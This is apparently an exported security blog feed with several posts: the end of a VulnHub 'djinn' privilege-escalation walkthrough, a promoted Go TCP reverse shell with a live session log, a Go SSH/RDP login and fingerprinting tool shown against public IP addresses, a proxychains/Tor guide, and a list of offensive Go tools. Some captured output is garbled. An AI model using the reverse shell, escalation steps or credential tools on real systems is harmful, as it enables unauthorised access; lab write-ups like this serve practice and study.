<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ genie</span><br><span class="line">genie</span><br><span class="line">usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line">genie: error: the following arguments are required: wish</span><br><span class="line">nitish@djinn:~$ genie -h</span><br><span class="line">genie -h</span><br><span class="line">usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line"></span><br><span class="line">I know you<span class="string">&#x27;ve came to me bearing wishes in mind. So go ahead make your wishes.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">positional arguments:</span></span><br><span class="line"><span class="string">  wish                  Enter your wish</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">optional arguments:</span></span><br><span class="line"><span class="string">  -h, --help            show this help message and exit</span></span><br><span class="line"><span class="string">  -g, --god             pass the wish to god</span></span><br><span class="line"><span class="string">  -p SHELL, --shell SHELL</span></span><br><span class="line"><span class="string">                        Gives you shell</span></span><br><span class="line"><span class="string">  -e EXEC, --exec EXEC  execute command</span></span><br></pre></td></tr></table></figure>

<p>now we get a shell of user sam</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ sudo -u sam genie -cmd new</span><br><span class="line">sudo -u sam genie -cmd new</span><br><span class="line">my man!!</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>

<p>use the following command to get a stable shell,then enumerate again</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash</span><br><span class="line">bash</span><br><span class="line">sam@djinn:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sam on djinn:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User sam may run the following commands on djinn:</span><br><span class="line">    (root) NOPASSWD: /root/lago</span><br></pre></td></tr></table></figure>

<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>and we get root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sam@djinn:~$ sudo -u root /root/lago </span><br><span class="line">sudo -u root /root/lago</span><br><span class="line">What <span class="keyword">do</span> you want to <span class="keyword">do</span> ?</span><br><span class="line">1 - Be naughty</span><br><span class="line">2 - Guess the number</span><br><span class="line">3 - Read some damn files</span><br><span class="line">4 - Work</span><br><span class="line">Enter your choice:2</span><br><span class="line">2</span><br><span class="line">Choose a number between 1 to 100: </span><br><span class="line">Enter your number: num</span><br><span class="line">num</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>next, we try to find the flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">bash</span><br><span class="line">root@djinn:~<span class="comment"># su root</span></span><br><span class="line">su root</span><br><span class="line">root@djinn:/home/nitish<span class="comment"># cd</span></span><br><span class="line">root@djinn:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">lago  proof.sh</span><br><span class="line">root@djinn:~<span class="comment"># ./proof.sh</span></span><br><span class="line">./proof.sh</span><br><span class="line"><span class="string">&#x27;unknown&#x27;</span>: I need something more specific.</span><br><span class="line">    _                        _             _ _ _ </span><br><span class="line">   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |</span><br><span class="line">  / _ \ | <span class="string">&#x27;_ ` _ \ / _` |_  / | &#x27;</span>_ \ / _` | | | |</span><br><span class="line"> / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|</span><br><span class="line">/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)</span><br><span class="line">                                     |___/       </span><br><span class="line">djinn pwned...</span><br><span class="line">__________________________________________________________________________</span><br><span class="line"></span><br><span class="line">Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc</span><br><span class="line">Path: /root</span><br><span class="line">Date: Sat May 23 11:23:39 IST 2020</span><br><span class="line">Whoami: root</span><br><span class="line">__________________________________________________________________________</span><br><span class="line"></span><br><span class="line">By @0xmzfr</span><br><span class="line"></span><br><span class="line">Thanks to my fellow teammates <span class="keyword">in</span> @m0tl3ycr3w <span class="keyword">for</span> betatesting! :-)</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub277.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>Command execution bypass</li>
<li>Sensitive information disclosure</li>
<li>custom program Privilege Escalation</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>goreverseshell---基于golang的tcp-reverseshell</title>
    <url>/2020/04/09/goreverseshell/</url>
    <content><![CDATA[<h4 id="Golang-Tcp-Reverse-Shell"><a href="#Golang-Tcp-Reverse-Shell" class="headerlink" title="Golang Tcp Reverse Shell"></a>Golang Tcp Reverse Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3JldmVyc2VzaGVsbA==">Download goreverseshell from my github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage of goreverseshell.exe:</span><br><span class="line">  -host string</span><br><span class="line">        the host to connect (default <span class="string">&quot;input host here&quot;</span>)</span><br><span class="line">  -port int</span><br><span class="line">        nc listenling port (default 5566)</span><br></pre></td></tr></table></figure>

<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;goreverseshell.exe -host 192.168.66.6 -port 5566</span><br><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br><span class="line"><span class="string">*ip:192.168.66.6------port:&amp;d</span></span><br><span class="line"><span class="string">%!(EXTRA int=5566)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam1.jpg"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.66.1: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.66.6] from (UNKNOWN) [192.168.66.1] 21322</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">lucifer11\hasee</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           LUCIFER11</span><br><span class="line">OS ����:          Microsoft Windows 10 ��ҵ��</span><br><span class="line">OS �汾:          10.0.18363 ��ȱ Build 18363</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     HASEE</span><br><span class="line">ע������:       </span><br><span class="line">��Ʒ ID:          00328-90000-00000-AAOEM</span><br><span class="line">��ʼ��װ����:     2019/9/23, 18:08:18</span><br><span class="line">ϵͳ����ʱ��:     2020/4/8, 15:28:33</span><br><span class="line">ϵͳ������:       HASEE Computer</span><br><span class="line">ϵͳ�ͺ�:         PA70ES                         </span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 ����������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2201 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 1.07.10RHS4, 2018/11/14</span><br><span class="line">Windows Ŀ¼:     C:\WINDOWS</span><br><span class="line">ϵͳĿ¼:         C:\WINDOWS\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume4</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00) ���������죬�����ر�����������³ľ��</span><br><span class="line">�����ڴ�����:     16,231 MB</span><br><span class="line">���õ������ڴ�:   6,104 MB</span><br><span class="line">�����ڴ�: ����: 19,303 MB</span><br><span class="line">�����ڴ�: ����:   4,390 MB</span><br><span class="line">�����ڴ�: ʹ����: 14,913 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WORKGROUP</span><br><span class="line">��¼������:       \\LUCIFER11</span><br><span class="line">�޲�����:         ��װ�� 14 ���޲�������</span><br><span class="line">                  [01]: KB4537572</span><br><span class="line">                  [02]: KB4515383</span><br><span class="line">                  [03]: KB4516115</span><br><span class="line">                  [04]: KB4517245</span><br><span class="line">                  [05]: KB4520390</span><br><span class="line">                  [06]: KB4521863</span><br><span class="line">                  [07]: KB4524244</span><br><span class="line">                  [08]: KB4524569</span><br><span class="line">                  [09]: KB4525419</span><br><span class="line">                  [10]: KB4528759</span><br><span class="line">                  [11]: KB4537759</span><br><span class="line">                  [12]: KB4538674</span><br><span class="line">                  [13]: KB4541338</span><br><span class="line">                  [14]: KB4541335</span><br><span class="line">����:             ��װ�� 8 �� NIC��</span><br><span class="line">                  [01]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line">                      ������:      VMware Network Adapter VMnet1</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 192.168.233.254</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.233.1</span><br><span class="line">                        [02]: fe80::9180:197a:ce35:69b8</span><br><span class="line">                  [02]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line">                      ������:      VMware Network Adapter VMnet8</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.66.1</span><br><span class="line">                        [02]: fe80::9d24:3f2d:1f79:94eb</span><br><span class="line">                  [03]: Intel(R) Wireless-AC 9462</span><br><span class="line">                      ������:      WLAN 2</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [04]: Realtek PCIe GbE Family Controller</span><br><span class="line">                      ������:      ����</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.1.56</span><br><span class="line">                        [02]: fe80::b11f:6ef2:7ec6:6eb3</span><br><span class="line">                  [05]: Bluetooth Device (Personal Area Network)</span><br><span class="line">                      ������:      ������������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [06]: Microsoft KM-TEST Loopback Adapter</span><br><span class="line">                      ������:      Npcap Loopback Adapter</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 255.255.255.255</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 169.254.234.82</span><br><span class="line">                        [02]: fe80::40e5:86bd:7eba:ea52</span><br><span class="line">                  [07]: VirtualBox Host-Only Ethernet Adapter</span><br><span class="line">                      ������:      VirtualBox Host-Only Network</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.56.1</span><br><span class="line">                        [02]: fe80::9429:8e07:8ee2:d61d</span><br><span class="line">                  [08]: TAP-Windows Adapter V9</span><br><span class="line">                      ������:      ��������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">Hyper-V Ҫ��:     ������������ģʽ��չ: ��</span><br><span class="line">                  �������������⻯: ��</span><br><span class="line">                  ������ת��: ��</span><br><span class="line">                  �����б�������: ��</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam2.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量级的golang tcp reverse shell</li>
<li>支持反弹windows和linux的shell</li>
<li>能多平台交叉编译使用</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goreverseshell.exe放在同一目录下即可</li>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p>:) enjoy it ! :)</p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>gordpssh-一款轻量级golang实现ssh和rdp管理工具</title>
    <url>/2020/03/25/gordpssh/</url>
    <content><![CDATA[<p><font color="red">有个基佬想要我用go搞个大范围识别ssh和rdp指纹，并将结果写入文件的工具，结果技术太菜，所以产生了下面这个残次品。顺便曝光那个基佬的微信号，大家去调戏他吧，哈哈哈。。。</font></p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao1.PNG"></li>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao2.PNG"></li>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao3.PNG"></li>
</ul>
<h3 id="gordpssh"><a href="#gordpssh" class="headerlink" title="gordpssh"></a>gordpssh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">&#123;a light ssh and rdp management tool&#125;</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>By Lucifer11</p>
</li>
<li><p>My QQ:1185151867</p>
</li>
<li><p><a href="https://fdlucifer.github.io/">My Blog</a></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3JkcHNzaA==">gordpssh download<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<a id="more"></a>

<h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -h</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">- &#123;your choice [1]&#125;</span><br><span class="line">Usage [gordpssh] [-s host] [-p port] [-u user] [-w password] [-c cmd]</span><br><span class="line"></span><br><span class="line"> - ssh example:</span><br><span class="line">        1) gordpssh -u root -p 9527 -s 1.1.1.1 -w 123456 -c <span class="string">&quot;uname -a&quot;</span></span><br><span class="line">        2) gordpssh --user root --port 9527 --host 1.1.1.1 --password 123456 --cmd <span class="string">&quot;uname -a&quot;</span></span><br><span class="line"> - <span class="keyword">if</span> use user &amp; pasword; the password is <span class="keyword">for</span> user.</span><br><span class="line"> - rdp example is the same as ssh example.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --cmd string        execute cmd <span class="keyword">in</span> server (default <span class="string">&quot;uname -a&quot;</span>)</span><br><span class="line">  -h, --<span class="built_in">help</span>              this <span class="built_in">help</span></span><br><span class="line">  -s, --host string       remote host addr ip (default <span class="string">&quot; &quot;</span>)</span><br><span class="line">  -w, --password string   <span class="keyword">if</span> use user &amp; password to login; the password is <span class="keyword">for</span> user. (default <span class="string">&quot; &quot;</span>)</span><br><span class="line">  -p, --port int          remote host port (default 22)</span><br><span class="line">  -u, --user string       remote host user (default <span class="string">&quot;root&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/help.jpg"></li>
</ul>
<h3 id="ssh-management"><a href="#ssh-management" class="headerlink" title="ssh management"></a>ssh management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -s &lt;ip addr&gt; -p &lt;port&gt; -u &lt;username&gt; -w &lt;password&gt;</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">- &#123;your choice [1]&#125;</span><br><span class="line">[+] ssh <span class="built_in">command</span> result is:</span><br><span class="line">Linux yisu-5de4c53d34764 3.10.0-327.el7.x86_64 <span class="comment">#1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">[+] host and ssh port is: 110.42.1.217 22</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/ssh.jpg"></li>
</ul>
<h3 id="rdp-management"><a href="#rdp-management" class="headerlink" title="rdp management"></a>rdp management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -s 39.104.21.7 -p 3389 -u adminstrator -w 12345678</span><br><span class="line">...</span><br><span class="line">2</span><br><span class="line">- &#123;your choice [2]&#125;</span><br><span class="line">39.104.21.7:3389</span><br><span class="line">[DEBUG][x224 sendConnectionRequest 0ee000000000000100080003000000]</span><br><span class="line">[DEBUG][tpkt Write 030000130ee000000000000100080003000000]</span><br><span class="line">[DEBUG][GetBytes:  0300]</span><br><span class="line">[DEBUG][tpkt recvHeader 0300 &lt;nil&gt;]</span><br><span class="line">[DEBUG][tptk recvHeader FASTPATH_ACTION_X224, <span class="built_in">wait</span> <span class="keyword">for</span> recvExtendedHeader]</span><br><span class="line">[DEBUG][GetBytes:  0013]</span><br><span class="line">[DEBUG][tpkt recvExtendedHeader 0013 &lt;nil&gt;]</span><br><span class="line">[DEBUG][tpkt <span class="built_in">wait</span> recvData]</span><br><span class="line">[DEBUG][GetBytes:  0ed00000123400020f080002000000]</span><br><span class="line">[DEBUG][tpkt recvData 0ed00000123400020f080002000000 &lt;nil&gt;]</span><br><span class="line">[DEBUG][x224 recvConnectionConfirm 0ed00000123400020f080002000000]</span><br><span class="line">[+] Os Fingerprint is: [0ed00000123400020f080002000000]</span><br><span class="line">[+] os version is 2012R2 OR 8</span><br><span class="line">[INFO][TYPE_RDP_NEG_RSP]</span><br><span class="line">[INFO][*** NLA Security selected ***]</span><br><span class="line">[INFO][StartNLA]</span><br><span class="line">[INFO][StartTLS]</span><br><span class="line">[DEBUG][recvChallenge 30820102a003020106a181fa3081f73081f4a081f10481ee4e544c4d53535000020000001e001e003800000035828a623c69b461abc3866d00000000000000009800980056000000060380250000000f69005a003000330064006f00720066006f006d0079003700340072005a0002001e0069005a003000330064006f00720066006f006d0079003700340072005a0001001e0069005a003000330064006f00720066006f006d0079003700340072005a0004001e0069005a003000330064006f00720066006f006d0079003700340072005a0003001e0069005a003000330064006f00720066006f006d0079003700340072005a0007000800d71b5d074800d60100000000]</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/rdp.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量的ssh，rdp管理客户端</li>
<li>连接ssh端口并能使用-c执行linux命令</li>
<li>连接rdp端口</li>
<li>识别rdp端口所在主机的指纹判断主机操作系统类型</li>
<li>持续更新</li>
</ul>
<h3 id="QQ-OR-微信"><a href="#QQ-OR-微信" class="headerlink" title="QQ OR 微信"></a>QQ OR 微信</h3><ul>
<li>1185151867</li>
<li>By Lucifer11 :)</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-proxychains-ssr翻墙</title>
    <url>/2019/02/13/kali-linux-proxychains-ssr/</url>
    <content><![CDATA[<p><font color="blue">上网泄露ip地址是一个非常严重的问题，不仅涉及自己的隐私被盗，造成一定的安全隐患，严重时，甚至可能会遭遇牢狱之灾。下面就来谈谈kali linux下的proxychain的使用。带来网络自由的快感。</font></p>
<p>首先执行下面的命令，打开没有修改proxychains代理前的浏览器，百度查看ip地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firefox www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains.jpg"></p>
<p><img src="/images/proxychains1.jpg"></p>
<a id="more"></a>

<p>可以看到ip地址还是本地的地址，下面来修改一下proxychains的配置文件，执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>按照下图所示的部分修改即可</p>
<p><img src="/images/proxychains2.jpg"></p>
<p><img src="/images/proxychains3.jpg"></p>
<p>然后ctrl+x保存退出即可</p>
<p><font color="red">注意，使用proxychains代理浏览器需要先搭建vps配置shadowsocksr代理，搭建和配置方法详见之前一篇的本人博客。</font></p>
<p>然后启动tor服务，tor具有匿名访问的功能，能够更好的保护隐私，防止DNS泄露</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service tor start</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains4.jpg"></p>
<p>接下来以proxychains代理的方式来启动浏览器打开<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb23ovpPlhaVpcOadpeafpeeci2lw5Zyw5Z2ALw==">www.baidu.com输入ip来查看ip地址<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains firefox www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains5.jpg"></p>
<p><img src="/images/proxychains6.jpg"></p>
<p>再来试下打开谷歌</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains firefox www.google.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains7.jpg"></p>
<p>完全没问题！</p>
<p>另外，如果不想敲命令的话，也可以按如下图所示配置浏览器，效果是一样的</p>
<p><img src="/images/proxychains8.jpg"></p>
]]></content>
      <categories>
        <category>kali配置</category>
      </categories>
      <tags>
        <tag>proxychains</tag>
      </tags>
  </entry>
  <entry>
    <title>hack-with-golang-go-github-安全资源合集</title>
    <url>/2020/03/25/hack-with-golang/</url>
    <content><![CDATA[<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/coderain.gif"></li>
</ul>
<h3 id="批量ssh管理工具"><a href="#批量ssh管理工具" class="headerlink" title="批量ssh管理工具"></a>批量ssh管理工具</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9tdWx0aXNzaA==">multissh<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="Security-with-Go"><a href="#Security-with-Go" class="headerlink" title="Security-with-Go"></a>Security-with-Go</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9TZWN1cml0eS13aXRoLUdv">Security-with-Go<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="lcx在golang下的实现-内网穿透-端口转发工具"><a href="#lcx在golang下的实现-内网穿透-端口转发工具" class="headerlink" title="lcx在golang下的实现(内网穿透-端口转发工具)"></a>lcx在golang下的实现(内网穿透-端口转发工具)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9OQVRCeXBhc3M=">NATBypass<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="onionscan-暗网扫描器"><a href="#onionscan-暗网扫描器" class="headerlink" title="onionscan(暗网扫描器)"></a>onionscan(暗网扫描器)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9vbmlvbnNjYW4=">onionscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="goscan-交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化"><a href="#goscan-交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化" class="headerlink" title="goscan(交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化)"></a>goscan(交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3NjYW4=">goscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Hacking-With-Golang-Golang安全资源合集"><a href="#Hacking-With-Golang-Golang安全资源合集" class="headerlink" title="Hacking-With-Golang(Golang安全资源合集)"></a>Hacking-With-Golang(Golang安全资源合集)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9IYWNraW5nLVdpdGgtR29sYW5n">Hacking-With-Golang<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="gocrack-GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。"><a href="#gocrack-GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。" class="headerlink" title="gocrack(GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。)"></a>gocrack(GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2NyYWNr">gocrack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="x-crack-多协议弱口令扫描器"><a href="#x-crack-多协议弱口令扫描器" class="headerlink" title="x-crack(多协议弱口令扫描器)"></a>x-crack(多协议弱口令扫描器)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci94LWNyYWNr">x-crack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
